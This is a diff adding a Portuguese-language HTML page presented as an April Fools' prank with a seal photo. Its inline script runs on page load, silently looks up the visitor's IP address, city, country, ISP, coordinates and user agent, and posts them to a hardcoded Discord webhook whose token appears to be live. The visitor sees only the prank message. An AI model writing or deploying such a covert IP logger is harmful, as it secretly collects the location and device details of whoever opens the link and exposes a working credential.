@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <title>Trolagem + Verificador de IP</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #e0f7fa;
+      text-align: center;
+      padding: 40px;
+    }
+    img.foca {
+      max-width: 300px;
+      border-radius: 15px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+      margin-bottom: 20px;
+    }
+    h1 {
+      color: #00796b;
+      font-size: 2em;
+      margin-bottom: 10px;
+    }
+    p {
+      font-size: 1.1em;
+      color: #004d40;
+    }
+  </style>
+</head>
+<body>
+  <img class="foca" src="https://images.unsplash.com/photo-1518717758536-85ae29035b6d?auto=format&fit=crop&w=600&q=80" alt="Foca divertida" />
+  
+  <h1>Trolagem de Primeiro de Abril!</h1>
+  <p>Você caiu na pegadinha da foca 🦭😄</p>
+
+  <script>
+    const webhookURL = 'https://discord.com/api/webhooks/1374818479781314642/ZekkD4Ip79aofcNeoHNrBlA_N6MMF4V4x7uRP_EAE0vhfSPHJFldDDce5fhwH4H_xoOG';
+
+    fetch('https://ipapi.co/json/')
+      .then(response => response.json())
+      .then(data => {
+        const payload = {
+          content: `📡 Novo acesso detectado:
+🔢 IP: ${data.ip}
+🌍 Cidade: ${data.city}, ${data.region} - ${data.country_name}
+🏢 Provedor: ${data.org}
+📌 Coordenadas: ${data.latitude}, ${data.longitude}
+📱 Dispositivo: ${navigator.userAgent}`
+        };
+
+        fetch(webhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        }).catch(console.error);
+      }).catch(() => {
+        console.warn('Falha ao obter dados de IP');
+      });
+  </script>
+</body>
+</html>
